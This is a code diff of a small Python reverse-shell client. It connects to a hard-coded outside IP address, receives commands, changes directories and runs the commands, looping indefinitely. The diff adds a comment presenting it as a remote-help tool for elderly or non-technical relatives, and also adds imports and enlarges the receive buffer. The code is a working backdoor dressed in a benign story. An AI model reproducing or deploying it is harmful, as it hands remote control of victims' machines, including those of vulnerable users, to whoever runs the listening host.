@@ -1,4 +1,6 @@
-import socket, os, subprocess
+#USE DOCKER TO MAKE THIS USABLE ON WINDOWS LAPTOPS; THIS PROGRAM WILL BE WHAT AVERAGE PEOPLE USE TO HELP AN ELDERLY OR NO TECH SAVY LOVED ONE WITH COMPUTER PROBLEMS
+
+import socket, os, subprocess, urllib.request, urllib.parse, re, time
 
 s = socket.socket()
 host = "168.235.86.52"
@@ -8,7 +10,7 @@ s.connect((host, port))
 
 while True:
     #recv function takes a number as an arguement; arguement is the buffer time
-    data = s.recv(1024)
+    data = s.recv(20480)
     #this conditionals takes the bytes and decodes them into a string format then it checks to see if the first two characaters are 'cd'
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
@@ -23,3 +25,4 @@ while True:
 
       print(output_str)
       
+    
